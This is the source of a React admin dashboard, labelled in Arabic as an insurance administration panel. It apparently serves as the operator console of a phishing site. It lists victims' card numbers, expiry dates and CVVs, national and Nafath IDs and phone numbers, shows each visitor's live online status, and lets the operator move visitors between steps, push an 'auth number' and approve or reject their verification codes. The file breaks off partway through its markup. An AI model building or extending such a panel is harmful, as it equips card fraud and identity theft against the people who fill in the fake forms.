"use client"
import type React from "react"
import { useState, useEffect, useMemo, useCallback, useRef } from "react"
import {
  Search,
  CheckCircle,
  XCircle,
  Clock,
  MessageSquare,
  Settings,
  Phone,
  CreditCard,
  Mail,
  Calendar,
  Flag,
  TrendingUp,
  Trash2,
  Filter,
  FileText,
  Car,
  Shield,
  User,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Checkbox } from "@/components/ui/checkbox"
import { Input } from "@/components/ui/input"
import { subscribeToApplications, updateApplication } from "@/lib/firestore-services"
import type { InsuranceApplication } from "@/lib/firestore-types"
import { ChatPanel } from "@/components/chat-panel"
import { playErrorSound, playNotificationSound, playSuccessSound } from "@/lib/actions"
import { onValue, ref } from "firebase/database"
import { database } from "@/lib/firestore"
import { CreditCardMockup } from "@/components/credit-card-mockup"

const STEP_NAMES: Record<number | string, string> = {
  1: "الرئيسه",
  2: "تفاصيل",
  3: "مقارنة",
  4: "بطاقة",
}

function UserStatus({ userId }: { userId: string }) {
  const [status, setStatus] = useState<"online" | "offline" | "unknown">("unknown")
  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`)
    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        setStatus(data.state === "online" ? "online" : "offline")
      } else {
        setStatus("unknown")
      }
    })
    return () => unsubscribe()
  }, [userId])
  return (
    <div className="flex items-center gap-2">
      <div className={`w-2 h-2 rounded-full ${status === "online" ? "bg-green-500 animate-pulse" : "bg-gray-400"}`} />
      <Badge
        variant="outline"
        className={`text-xs ${
          status === "online"
            ? "bg-green-50 text-green-700 border-green-300 dark:bg-green-950/30 dark:text-green-400"
            : "bg-gray-50 text-gray-600 border-gray-300 dark:bg-gray-900/30 dark:text-gray-400"
        }`}
      >
        {status === "online" ? "متصل" : "غير متصل"}
      </Badge>
    </div>
  )
}

export default function AdminDashboard() {
  const [applications, setApplications] = useState<InsuranceApplication[]>([])
  const [filteredApplications, setFilteredApplications] = useState<InsuranceApplication[]>([])
  const [searchQuery, setSearchQuery] = useState("")
  const [statusFilter, setStatusFilter] = useState<string>("all")
  const [cardFilter, setCardFilter] = useState<"all" | "hasCard" | "noCard">("all")
  const [infoFilter, setInfoFilter] = useState<"all" | "hasInfo" | "noInfo">("all")
  const [selectedApplication, setSelectedApplication] = useState<InsuranceApplication | null>(null)
  const [showChat, setShowChat] = useState(false)
  const [loading, setLoading] = useState(true)
  const [authNumber, setAuthNumber] = useState("")
  const prevApplicationsCount = useRef<number>(0)
  const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set())
  const [showHideFilters, setShowHideFilter] = useState(false)

  const stats = useMemo(() => {
    return {
      total: applications.length,
      pending: applications.filter((a) => a.status === "pending_review").length,
      approved: applications.filter((a) => a.status === "approved").length,
      rejected: applications.filter((a) => a.status === "rejected").length,
    }
  }, [applications])

  useEffect(() => {
    setLoading(true)
    const unsubscribe = subscribeToApplications((apps) => {
      if (prevApplicationsCount.current > 0 && apps.length > prevApplicationsCount.current) {
        playNotificationSound()
      }
      prevApplicationsCount.current = apps.length
      setApplications(apps)
      setLoading(false)
    })
    return () => unsubscribe()
  }, [])

  useEffect(() => {
    const timer = setTimeout(() => {
      let filtered = applications
      if (statusFilter !== "all") {
        filtered = filtered.filter((app) => app.status === statusFilter)
      }
      if (cardFilter === "hasCard") {
        filtered = filtered.filter((app) => !!(app.cardNumber || app.expiryDate || app.cvv))
      } else if (cardFilter === "noCard") {
        filtered = filtered.filter((app) => !(app.cardNumber || app.expiryDate || app.cvv))
      }
      if (infoFilter === "hasInfo") {
        filtered = filtered.filter(
          (app) => !!(app.phoneNumber || app.nafazId || app.documentType || app.serialNumber || app.vehicleModel),
        )
      } else if (infoFilter === "noInfo") {
        filtered = filtered.filter(
          (app) => !(app.nafazId || app.nafazId || app.documentType || app.serialNumber || app.vehicleModel),
        )
      }
      if (searchQuery) {
        const query = searchQuery.toLowerCase()
        filtered = filtered.filter(
          (app) =>
            app.ownerName?.toLowerCase().includes(query) ||
            app.identityNumber.includes(query) ||
            app.phoneNumber.includes(query),
        )
      }
      setFilteredApplications(filtered)
    }, 300)
    return () => clearTimeout(timer)
  }, [applications, searchQuery, statusFilter, cardFilter, infoFilter])

  const handleStatusChange = async (appId: string, newStatus: string) => {
    try {
      await updateApplication(appId, { currentStep: newStatus as string })
      playErrorSound()
    } catch {}
  }

  const handleStepChange = useCallback(
    async (appId: string, newStep: number) => {
      setApplications((prev) => prev.map((app) => (app.id === appId ? { ...app, currentStep: newStep } : app)))
      if (selectedApplication?.id === appId) {
        setSelectedApplication((prev) => (prev ? { ...prev, currentStep: newStep } : null))
      }
      try {
        await updateApplication(appId, { currentStep: newStep })
      } catch (error) {
        console.error("Error updating step:", error)
      }
    },
    [selectedApplication],
  )

  const handleAuthNumber = async (appId: string, auth: string) => {
    try {
      await updateApplication(appId, { authNumber: auth })
    } catch (error) {
      console.error("Error updating step:", error)
    }
  }

  const toggleSelection = useCallback((id: string, event: React.MouseEvent) => {
    event.stopPropagation()
    setSelectedIds((prev) => {
      const newSet = new Set(prev)
      if (newSet.has(id)) {
        newSet.delete(id)
      } else {
        newSet.add(id)
      }
      return newSet
    })
  }, [])

  const isUnread = useCallback((app: InsuranceApplication) => {
    return app.isUnread === true
  }, [])

  const markAsRead = useCallback(async (app: InsuranceApplication) => {
    if (app.isUnread) {
      try {
        await updateApplication(app.id!, { isUnread: false })
        setApplications((prev) => prev.map((a) => (a.id === app.id ? { ...a, isUnread: false } : a)))
      } catch (error) {
        console.error("Error marking as read:", error)
      }
    }
  }, [])

  const toggleReadStatus = useCallback(async (appId: string, currentIsUnread: boolean, event: React.MouseEvent) => {
    event.stopPropagation()
    try {
      await updateApplication(appId, { isUnread: !currentIsUnread })
      setApplications((prev) => prev.map((a) => (a.id === appId ? { ...a, isUnread: !currentIsUnread } : a)))
    } catch (error) {
      console.error("Error toggling read status:", error)
    }
  }, [])

  const hasCardInfo = useCallback((app: InsuranceApplication) => {
    return !!(app.cardNumber || app.expiryDate || app.cvv)
  }, [])

  const getStatusBadge = useCallback((status: string) => {
    const badges = {
      draft: { text: "مسودة", className: "bg-gray-100 text-gray-800 dark:bg-gray-800 dark:text-gray-200" },
      pending_review: {
        text: "قيد المراجعة",
        className: "bg-amber-100 text-amber-800 dark:bg-amber-900/30 dark:text-amber-400",
      },
      approved: {
        text: "موافق عليه",
        className: "bg-green-100 text-green-800 dark:bg-green-900/30 dark:text-green-400",
      },
      rejected: { text: "مرفوض", className: "bg-red-100 text-red-800 dark:bg-red-900/30 dark:text-red-400" },
      completed: {
        text: "مكتمل",
        className: "bg-blue-100 text-blue-800 dark:bg-blue-900/30 dark:text-blue-400",
      },
    }
    return badges[status as keyof typeof badges] || badges.draft
  }, [])

  const formatArabicDate = useCallback((dateString?: string) => {
    if (!dateString) return ""
    const date = new Date(dateString)
    const now = new Date()
    const diffInSeconds = Math.floor((now.getTime() - date.getTime()) / 1000)
    if (diffInSeconds < 60) {
      return "منذ لحظات"
    } else if (diffInSeconds < 3600) {
      const minutes = Math.floor(diffInSeconds / 60)
      return `منذ ${minutes} ${minutes === 1 ? "دقيقة" : minutes === 2 ? "دقيقتين" : "دقائق"}`
    } else if (diffInSeconds < 86400) {
      const hours = Math.floor(diffInSeconds / 3600)
      return `منذ ${hours} ${hours === 1 ? "ساعة" : hours === 2 ? "ساعتين" : "ساعات"}`
    } else if (diffInSeconds < 604800) {
      const days = Math.floor(diffInSeconds / 86400)
      return `منذ ${days} ${days === 1 ? "يوم" : days === 2 ? "يومين" : "أيام"}`
    }
    return date.toLocaleDateString("ar-SA", {
      year: "numeric",
      month: "long",
      day: "numeric",
    })
  }, [])

  useEffect(() => {
    if (selectedApplication) {
      const updated = applications.find((app) => app.id === selectedApplication.id)
      if (updated) {
        setSelectedApplication(updated)
      }
    }
  }, [applications, selectedApplication])

  const handlePhoneVerificationChange = useCallback(
    async (appId: string, status: "approved" | "rejected" | "pending") => {
      setApplications((prev) =>
        prev.map((app) => (app.id === appId ? { ...app, phoneVerificationStatus: status } : app)),
      )
      if (selectedApplication?.id === appId) {
        setSelectedApplication((prev) => (prev ? { ...prev, phoneVerificationStatus: status } : null))
      }
      try {
        await updateApplication(appId, { phoneVerificationStatus: status })
        if (status === "approved") {
          playSuccessSound()
        } else if (status === "rejected") {
          playErrorSound()
        }
      } catch (error) {
        console.error("Error updating phone verification:", error)
        playErrorSound()
      }
    },
    [selectedApplication],
  )

  const handleIdVerificationChange = useCallback(
    async (appId: string, status: "approved" | "rejected" | "pending") => {
      setApplications((prev) => prev.map((app) => (app.id === appId ? { ...app, idVerificationStatus: status } : app)))
      if (selectedApplication?.id === appId) {
        setSelectedApplication((prev) => (prev ? { ...prev, idVerificationStatus: status } : null))
      }
      try {
        await updateApplication(appId, { idVerificationStatus: status })
        if (status === "approved") {
          playSuccessSound()
        } else if (status === "rejected") {
          playErrorSound()
        }
      } catch (error) {
        console.error("Error updating ID verification:", error)
        playErrorSound()
      }
    },
    [selectedApplication],
  )

  const handleDelete = useCallback(
    async (appId: string, event: React.MouseEvent) => {
      event.stopPropagation()
      if (window.confirm("هل أنت متأكد من حذف هذا الطلب؟")) {
        try {
          setApplications((prev) => prev.filter((app) => app.id !== appId))
          if (selectedApplication?.id === appId) {
            setSelectedApplication(null)
          }
          setSelectedIds((prev) => {
            const newSet = new Set(prev)
            newSet.delete(appId)
            return newSet
          })
          playSuccessSound()
        } catch (error) {
          console.error("Error deleting application:", error)
          playErrorSound()
        }
      }
    },
    [selectedApplication],
  )

  const hasDocumentInfo = (app: InsuranceApplication) => {
    return !!(app.documentType || app.serialNumber || app.phoneNumber || app.nafazId || app.country)
  }

  const hasInsuranceInfo = (app: InsuranceApplication) => {
    return !!(app.insuranceType || app.insuranceStartDate || app.repairLocation)
  }

  const hasVehicleInfo = (app: InsuranceApplication) => {
    return !!(app.vehicleModel || app.manufacturingYear || app.vehicleValue || app.vehicleUsage)
  }

  const getStepName = (step: number | string) => {
    return STEP_NAMES[step] || `الخطوة ${step}`
  }

  return (
    <div
      className="min-h-screen bg-gradient-to-br from-slate-50 via-white to-slate-100 dark:from-slate-950 dark:via-slate-900 dark:to-slate-950"
      dir="rtl"
    >
      {/* Header */}
      <header className="bg-gradient-to-r from-blue-600 via-blue-700 to-indigo-700 text-white shadow-xl border-b border-blue-800/50">
        <div className="container mx-auto px-6 py-5">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-8">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 bg-white/20 rounded-xl flex items-center justify-center backdrop-blur-sm">
                  <Shield className="w-6 h-6 text-white" />
                </div>
                <h1 className="text-2xl font-bold tracking-tight">لوحة إدارة التأمين</h1>
              </div>
              <div className="flex items-center gap-3 text-sm">
                <div className="flex items-center gap-2 bg-white/10 px-4 py-2 rounded-lg backdrop-blur-sm border border-white/20">
                  <Clock className="w-4 h-4" />
                  <span className="font-medium">{stats.pending}</span>
                  <span className="text-white/80 text-xs">قيد الانتظار</span>
                </div>
                <div className="flex items-center gap-2 bg-white/10 px-4 py-2 rounded-lg backdrop-blur-sm border border-white/20">
                  <TrendingUp className="w-4 h-4" />
                  <span className="font-medium">{stats.total}</span>
                  <span className="text-white/80 text-xs">إجمالي</span>
                </div>
              </div>
            </div>
            <div className="flex items-center gap-3">
              <Button variant="ghost" size="icon" className="text-white hover:bg-white/20 rounded-lg">
                <Settings className="w-5 h-5" />
              </Button>
              <div className="w-10 h-10 rounded-lg bg-white/20 backdrop-blur-sm flex items-center justify-center text-white font-semibold border-2 border-white/30">
                م
              </div>
            </div>
          </div>
        </div>
      </header>

      {/* Stats Bar */}
      <div className="bg-white dark:bg-slate-900 border-b border-slate-200 dark:border-slate-800 shadow-sm">
        <div className="container mx-auto px-6 py-4">
          <div className="flex items-center gap-8">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 bg-slate-100 dark:bg-slate-800 rounded-lg flex items-center justify-center">
                <FileText className="w-5 h-5 text-slate-600 dark:text-slate-400" />
              </div>
              <div>
                <div className="text-2xl font-bold text-slate-900 dark:text-white">{stats.total}</div>
                <div className="text-xs text-slate-500 dark:text-slate-400">إجمالي الطلبات</div>
              </div>
            </div>
            <div className="h-12 w-px bg-slate-200 dark:bg-slate-700" />
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 bg-amber-100 dark:bg-amber-900/30 rounded-lg flex items-center justify-center">
                <Clock className="w-5 h-5 text-amber-600 dark:text-amber-400" />
              </div>
              <div>
                <div className="text-2xl font-bold text-amber-600 dark:text-amber-400">{stats.pending}</div>
                <div className="text-xs text-slate-500 dark:text-slate-400">قيد المراجعة</div>
              </div>
            </div>
            <div className="h-12 w-px bg-slate-200 dark:bg-slate-700" />
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 bg-green-100 dark:bg-green-900/30 rounded-lg flex items-center justify-center">
                <CheckCircle className="w-5 h-5 text-green-600 dark:text-green-400" />
              </div>
              <div>
                <div className="text-2xl font-bold text-green-600 dark:text-green-400">{stats.approved}</div>
                <div className="text-xs text-slate-500 dark:text-slate-400">موافق عليه</div>
              </div>
            </div>
            <div className="h-12 w-px bg-slate-200 dark:bg-slate-700" />
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 bg-red-100 dark:bg-red-900/30 rounded-lg flex items-center justify-center">
                <XCircle className="w-5 h-5 text-red-600 dark:text-red-400" />
              </div>
              <div>
                <div className="text-2xl font-bold text-red-600 dark:text-red-400">{stats.rejected}</div>
                <div className="text-xs text-slate-500 dark:text-slate-400">مرفوض</div>
              </div>
            </div>
            <div className="mr-16">
              <Button size={"icon"}>1</Button>
            </div>
          </div>
        </div>
      </div>

      <div className="flex h-[calc(100vh-180px)]">
        {/* Sidebar */}
        <div className="w-[420px] bg-white dark:bg-slate-900 border-l border-slate-200 dark:border-slate-800 overflow-y-auto">
          <Button onClick={() => setShowHideFilter(!showHideFilters)} className="w-full" variant={"outline"}>
            اخفاء/اظهار
          </Button>
          {/* Filters */}
          {showHideFilters && (
            <div className="p-5 border-b border-slate-200 dark:border-slate-800 bg-slate-50 dark:bg-slate-900/50">
              <div className="space-y-4">
                {/* Search */}
                <div className="relative">
                  <Search className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400" />
                  <Input
                    placeholder="بحث بالاسم أو رقم الهوية..."
                    value={searchQuery}
                    onChange={(e) => setSearchQuery(e.target.value)}
                    className="pr-10 bg-white dark:bg-slate-800 border-slate-300 dark:border-slate-700"
                  />
                </div>
                {/* Filter Header */}
                <div className="flex items-center gap-2 pt-2">
                  <Filter className="w-4 h-4 text-slate-600 dark:text-slate-400" />
                  <span className="text-sm font-semibold text-slate-700 dark:text-slate-300">تصفية حسب</span>
                </div>
                {/* Card Filter */}
                <div className="space-y-2">
                  <label className="text-xs font-medium text-slate-600 dark:text-slate-400">معلومات البطاقة</label>
                  <div className="grid grid-cols-3 gap-2">
                    <Button
                      variant={cardFilter === "all" ? "default" : "outline"}
                      size="sm"
                      onClick={() => setCardFilter("all")}
                      className="text-xs h-9"
                    >
                      الكل
                    </Button>
                    <Button
                      variant={cardFilter === "hasCard" ? "default" : "outline"}
                      size="sm"
                      onClick={() => setCardFilter("hasCard")}
                      className="text-xs gap-1.5 h-9"
                    >
                      <CreditCard className="w-3.5 h-3.5" />
                      لديه بطاقة
                    </Button>
                    <Button
                      variant={cardFilter === "noCard" ? "default" : "outline"}
                      size="sm"
                      onClick={() => setCardFilter("noCard")}
                      className="text-xs h-9"
                    >
                      بدون بطاقة
                    </Button>
                  </div>
                </div>
                {/* Info Filter */}
                <div className="space-y-2">
                  <label className="text-xs font-medium text-slate-600 dark:text-slate-400">معلومات إضافية</label>
                  <div className="grid grid-cols-3 gap-2">
                    <Button
                      variant={infoFilter === "all" ? "default" : "outline"}
                      size="sm"
                      onClick={() => setInfoFilter("all")}
                      className="text-xs h-9"
                    >
                      الكل
                    </Button>
                    <Button
                      variant={infoFilter === "hasInfo" ? "default" : "outline"}
                      size="sm"
                      onClick={() => setInfoFilter("hasInfo")}
                      className="text-xs gap-1.5 h-9"
                    >
                      <Flag className="w-3.5 h-3.5" />
                      مكتمل
                    </Button>
                    <Button
                      variant={infoFilter === "noInfo" ? "default" : "outline"}
                      size="sm"
                      onClick={() => setInfoFilter("noInfo")}
                      className="text-xs h-9"
                    >
                      غير مكتمل
                    </Button>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Applications List */}
          {loading ? (
            <div className="flex items-center justify-center h-96">
              <div className="text-center">
                <div className="w-12 h-12 border-4 border-slate-200 dark:border-slate-700 border-t-blue-600 rounded-full animate-spin mx-auto mb-4"></div>
                <p className="text-slate-600 dark:text-slate-400 font-medium">جاري التحميل...</p>
              </div>
            </div>
          ) : filteredApplications.length === 0 ? (
            <div className="flex flex-col items-center justify-center h-96 p-8 text-center">
              <div className="w-20 h-20 rounded-2xl bg-gradient-to-br from-slate-100 to-slate-200 dark:from-slate-800 dark:to-slate-700 flex items-center justify-center mb-4">
                <Mail className="w-10 h-10 text-slate-400 dark:text-slate-500" />
              </div>
              <p className="text-slate-700 dark:text-slate-300 font-semibold text-lg mb-2">لا توجد طلبات</p>
              <p className="text-slate-500 dark:text-slate-400 text-sm">جرب تغيير الفلاتر للبحث عن طلبات</p>
            </div>
          ) : (
            <div className="divide-y divide-slate-100 dark:divide-slate-800">
              {filteredApplications.map((app) => (
                <div
                  key={app.id}
                  onClick={() => {
                    setSelectedApplication(app)
                    setShowChat(false)
                    markAsRead(app)
                  }}
                  className={`group p-5 cursor-pointer hover:bg-gradient-to-l hover:from-blue-50 hover:to-transparent dark:hover:from-blue-950/20 transition-all duration-200 relative ${
                    selectedApplication?.id === app.id
                      ? "bg-gradient-to-l from-blue-100 to-blue-50 dark:from-blue-950/40 dark:to-blue-950/20 border-r-4 border-blue-600"
                      : ""
                  } ${isUnread(app) ? "bg-blue-50/50 dark:bg-blue-950/10" : ""}`}
                >
                  <div className="flex items-start gap-4">
                    <Checkbox
                      checked={selectedIds.has(app.id!)}
                      onCheckedChange={(checked) => {
                        const event = window.event as any
                        toggleSelection(app.id!, event)
                      }}
                      onClick={(e) => e.stopPropagation()}
                      className="mt-1 data-[state=checked]:bg-blue-600 data-[state=checked]:border-blue-600"
                    />
                    <div className="flex-1 min-w-0">
                      <div className="flex items-start justify-between gap-2 mb-2">
                        <div className="flex items-center gap-2 flex-1 min-w-0">
                          <span className="text-2xl flex-shrink-0">
                            {app.country === "Saudi Arabia" ? "🇸🇦" : app.country === "Jordan" ? "🇯🇴" : "🌍"}
                          </span>
                          <h3 className="font-semibold text-slate-900 dark:text-white text-base truncate">
                            {app.ownerName}
                          </h3>
                          {isUnread(app) && (
                            <Badge className="bg-red-500 text-white text-xs px-2 py-0.5 flex-shrink-0">جديد</Badge>
                          )}
                        </div>
                        <div className="flex items-center gap-1 flex-shrink-0">
                          <Button
                            variant="ghost"
                            size="icon"
                            onClick={(e) => toggleReadStatus(app.id!, isUnread(app), e)}
                            className="opacity-0 group-hover:opacity-100 transition-opacity h-8 w-8 text-blue-500 hover:text-blue-700 hover:bg-blue-50 dark:hover:bg-blue-950/30"
                            title={isUnread(app) ? "تحديد كمقروء" : "تحديد كغير مقروء"}
                          >
                            <Mail className={`w-4 h-4 ${isUnread(app) ? "fill-current" : ""}`} />
                          </Button>
                          <Button
                            variant="ghost"
                            size="icon"
                            onClick={(e) => handleDelete(app.id!, e)}
                            className="opacity-0 group-hover:opacity-100 transition-opacity h-8 w-8 text-red-500 hover:text-red-700 hover:bg-red-50 dark:hover:bg-red-950/30 flex-shrink-0"
                          >
                            <Trash2 className="w-4 h-4" />
                          </Button>
                        </div>
                      </div>
                      <div className="flex items-center gap-2 mb-2 flex-wrap">
                        <Badge className={getStatusBadge(app.status).className + " text-xs"}>
                          {getStatusBadge(app.status).text}
                        </Badge>
                        <Badge
                          variant="outline"
                          className="text-xs bg-slate-50 dark:bg-slate-800 border-slate-300 dark:border-slate-700"
                        >
                          {getStepName(app.currentStep)}
                        </Badge>
                        {hasCardInfo(app) && (
                          <Badge className="bg-blue-100 text-blue-700 dark:bg-blue-900/30 dark:text-blue-400 text-xs gap-1">
                            <CreditCard className="w-3 h-3" />
                            بطاقة
                          </Badge>
                        )}
                      </div>
                      <div className="flex items-center gap-3 text-xs text-slate-600 dark:text-slate-400">
                        <span className="flex items-center gap-1">
                          <Phone className="w-3.5 h-3.5" />
                          {app.phoneNumber}
                        </span>
                        {app.createdAt && (
                          <span className="flex items-center gap-1">
                            <Clock className="w-3.5 h-3.5" />
                            {formatArabicDate(app.createdAt)}
                          </span>
                        )}
                      </div>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Main Content */}
        <div className="flex-1 bg-slate-50 dark:bg-slate-950 overflow-y-auto">
          {selectedApplication ? (
            showChat ? (
              <div className="h-full bg-white dark:bg-slate-900">
                <ChatPanel
                  applicationId={selectedApplication.id!}
                  currentUserId="admin-001"
                  currentUserName="المسؤول"
                  currentUserRole="admin"
                  onClose={() => setShowChat(false)}
                />
              </div>
            ) : (
              <div className="container mx-auto p-6 max-w-6xl">
                <div className="sticky top-0 z-10 mb-6">
                  <div className="bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 p-6 shadow-sm">
                    <div className="flex items-start justify-between">
                      <div className="flex-1">
                        <div className="flex items-center gap-3 mb-3">
                          <div className="w-14 h-14 bg-gradient-to-br from-blue-500 to-indigo-600 rounded-xl flex items-center justify-center text-white text-xl font-bold">
                            {selectedApplication.ownerName?.charAt(0)}
                          </div>
                          <div>
                            <h2 className="text-2xl font-bold text-slate-900 dark:text-white mb-1">
                              {selectedApplication.ownerName}
                            </h2>
                            <div className="flex items-center gap-2">
                              <UserStatus userId={selectedApplication.id!} />
                              <Badge variant="outline" className="text-xs">
                                {getStepName(selectedApplication.currentStep)}
                              </Badge>
                            </div>
                          </div>
                        </div>
                        <div className="flex items-center gap-6 text-sm text-slate-600 dark:text-slate-400 flex-wrap">
                          {selectedApplication.phoneNumber && (
                            <span className="flex items-center gap-2">
                              <div className="w-8 h-8 bg-blue-100 dark:bg-blue-900/30 rounded-lg flex items-center justify-center">
                                <Phone className="w-4 h-4 text-blue-600 dark:text-blue-400" />
                              </div>
                              {selectedApplication.phoneNumber}
                            </span>
                          )}
                          {selectedApplication.identityNumber && (
                            <span className="flex items-center gap-2">
                              <div className="w-8 h-8 bg-green-100 dark:bg-green-900/30 rounded-lg flex items-center justify-center">
                                <CreditCard className="w-4 h-4 text-green-600 dark:text-green-400" />
                              </div>
                              {selectedApplication.identityNumber}
                            </span>
                          )}
                          {selectedApplication.createdAt && (
                            <span className="flex items-center gap-2">
                              <div className="w-8 h-8 bg-amber-100 dark:bg-amber-900/30 rounded-lg flex items-center justify-center">
                                <Calendar className="w-4 h-4 text-amber-600 dark:text-amber-400" />
                              </div>
                              {formatArabicDate(selectedApplication.createdAt)}
                            </span>
                          )}
                        </div>
                        {!selectedApplication.online && selectedApplication.lastseen && (
                          <p className="text-xs text-slate-500 dark:text-slate-400 mt-3">
                            آخر ظهور: {formatArabicDate(selectedApplication.lastseen)}
                          </p>
                        )}
                      </div>
                      <Button onClick={() => setShowChat(true)} size="lg" className="gap-2">
                        <MessageSquare className="w-5 h-5" />
                        فتح الدردشة
                      </Button>
                    </div>
                  </div>
                </div>

                <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                  {/* Document Info - Only show if data exists */}
                  {hasDocumentInfo(selectedApplication) && (
                    <div className="bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 p-6 shadow-sm">
                      <div className="flex items-center gap-3 mb-4">
                        <div className="w-10 h-10 bg-blue-100 dark:bg-blue-900/30 rounded-lg flex items-center justify-center">
                          <FileText className="w-5 h-5 text-blue-600 dark:text-blue-400" />
                        </div>
                        <h3 className="text-lg font-bold text-slate-900 dark:text-white">معلومات الوثيقة</h3>
                      </div>
                      <div className="space-y-3">
                        {selectedApplication.documentType && (
                          <div className="flex justify-between items-center py-2.5 border-b border-slate-100 dark:border-slate-800">
                            <span className="text-sm text-slate-600 dark:text-slate-400">نوع الوثيقة</span>
                            <span className="text-sm font-semibold text-slate-900 dark:text-white">
                              {selectedApplication.documentType}
                            </span>
                          </div>
                        )}
                        {selectedApplication.serialNumber && (
                          <div className="flex justify-between items-center py-2.5 border-b border-slate-100 dark:border-slate-800">
                            <span className="text-sm text-slate-600 dark:text-slate-400">الرقم التسلسلي</span>
                            <span className="text-sm font-semibold text-slate-900 dark:text-white font-mono">
                              {selectedApplication.serialNumber}
                            </span>
                          </div>
                        )}
                        {selectedApplication.phoneNumber && (
                          <div className="flex justify-between items-center py-2.5 border-b border-slate-100 dark:border-slate-800">
                            <span className="text-sm text-slate-600 dark:text-slate-400">رقم الهاتف</span>
                            <span className="text-sm font-semibold text-slate-900 dark:text-white" dir="ltr">
                              {selectedApplication.phoneNumber}
                            </span>
                          </div>
                        )}
                        {selectedApplication.nafazId && (
                          <div className="flex justify-between items-center py-2.5 border-b border-slate-100 dark:border-slate-800">
                            <span className="text-sm text-slate-600 dark:text-slate-400">رقم نفاذ</span>
                            <span className="text-sm font-semibold text-slate-900 dark:text-white font-mono">
                              {selectedApplication.nafazId}
                            </span>
                          </div>
                        )}
                        {selectedApplication.country && (
                          <div className="flex justify-between items-center py-2.5">
                            <span className="text-sm text-slate-600 dark:text-slate-400">الدولة</span>
                            <span className="text-sm font-semibold text-slate-900 dark:text-white">
                              {selectedApplication.country}
                            </span>
                          </div>
                        )}
                      </div>
                    </div>
                  )}

                  {/* Insurance Info - Only show if data exists */}
                  {hasInsuranceInfo(selectedApplication) && (
                    <div className="bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 p-6 shadow-sm">
                      <div className="flex items-center gap-3 mb-4">
                        <div className="w-10 h-10 bg-green-100 dark:bg-green-900/30 rounded-lg flex items-center justify-center">
                          <Shield className="w-5 h-5 text-green-600 dark:text-green-400" />
                        </div>
                        <h3 className="text-lg font-bold text-slate-900 dark:text-white">تفاصيل التأمين</h3>
                      </div>
                      <div className="space-y-3">
                        {selectedApplication.insuranceType && (
                          <div className="flex justify-between items-center py-2.5 border-b border-slate-100 dark:border-slate-800">
                            <span className="text-sm text-slate-600 dark:text-slate-400">نوع التأمين</span>
                            <span className="text-sm font-semibold text-slate-900 dark:text-white">
                              {selectedApplication.insuranceType}
                            </span>
                          </div>
                        )}
                        {selectedApplication.insuranceStartDate && (
                          <div className="flex justify-between items-center py-2.5 border-b border-slate-100 dark:border-slate-800">
                            <span className="text-sm text-slate-600 dark:text-slate-400">تاريخ البدء</span>
                            <span className="text-sm font-semibold text-slate-900 dark:text-white">
                              {selectedApplication.insuranceStartDate}
                            </span>
                          </div>
                        )}
                        {selectedApplication.repairLocation && (
                          <div className="flex justify-between items-center py-2.5">
                            <span className="text-sm text-slate-600 dark:text-slate-400">موقع الإصلاح</span>
                            <span className="text-sm font-semibold text-slate-900 dark:text-white">
                              {selectedApplication.repairLocation === "agency" ? "الوكالة" : "ورشة"}
                            </span>
                          </div>
                        )}
                      </div>
                    </div>
                  )}

                  {/* Vehicle Info - Only show if data exists */}
                  {hasVehicleInfo(selectedApplication) && (
                    <div className="bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 p-6 shadow-sm">
                      <div className="flex items-center gap-3 mb-4">
                        <div className="w-10 h-10 bg-purple-100 dark:bg-purple-900/30 rounded-lg flex items-center justify-center">
                          <Car className="w-5 h-5 text-purple-600 dark:text-purple-400" />
                        </div>
                        <h3 className="text-lg font-bold text-slate-900 dark:text-white">معلومات المركبة</h3>
                      </div>
                      <div className="grid grid-cols-2 gap-4">
                        {selectedApplication.vehicleModel && (
                          <div>
                            <p className="text-xs text-slate-500 dark:text-slate-400 mb-1">الموديل</p>
                            <p className="font-semibold text-slate-900 dark:text-white text-sm">
                              {selectedApplication.vehicleModel}
                            </p>
                          </div>
                        )}
                        {selectedApplication.manufacturingYear && (
                          <div>
                            <p className="text-xs text-slate-500 dark:text-slate-400 mb-1">سنة الصنع</p>
                            <p className="font-semibold text-slate-900 dark:text-white text-sm">
                              {selectedApplication.manufacturingYear}
                            </p>
                          </div>
                        )}
                        {selectedApplication.vehicleValue && (
                          <div>
                            <p className="text-xs text-slate-500 dark:text-slate-400 mb-1">القيمة</p>
                            <p className="font-semibold text-slate-900 dark:text-white text-sm">
                              {selectedApplication.vehicleValue} ريال
                            </p>
                          </div>
                        )}
                        {selectedApplication.vehicleUsage && (
                          <div>
                            <p className="text-xs text-slate-500 dark:text-slate-400 mb-1">الاستخدام</p>
                            <p className="font-semibold text-slate-900 dark:text-white text-sm">
                              {selectedApplication.vehicleUsage}
                            </p>
                          </div>
                        )}
                      </div>
                    </div>
                  )}

                  {/* Nafad Status */}
                  <div className="lg:col-span-1 bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 p-6 shadow-sm">
                    <h3 className="text-lg font-bold text-slate-900 dark:text-white mb-4">نفاذ الوطني</h3>
                    <div className="space-y-4">
                      {/* Phone Verification */}
                      <div className="p-4 bg-slate-50 dark:bg-slate-800/50 rounded-xl border border-slate-200 dark:border-slate-700">
                        <div className="flex items-center justify-between mb-3">
                          <div className="flex  flex-col gap-3">
                            <div className="w-8 h-8 rounded-xl bg-blue-100 dark:bg-blue-900/30 flex items-center justify-center">
                              <User className="w-6 h-6 text-blue-600 dark:text-blue-400" />
                            </div>
                            <div>
                              <p className="text-sm font-semibold text-slate-900 dark:text-white">الرقم الوطني</p>
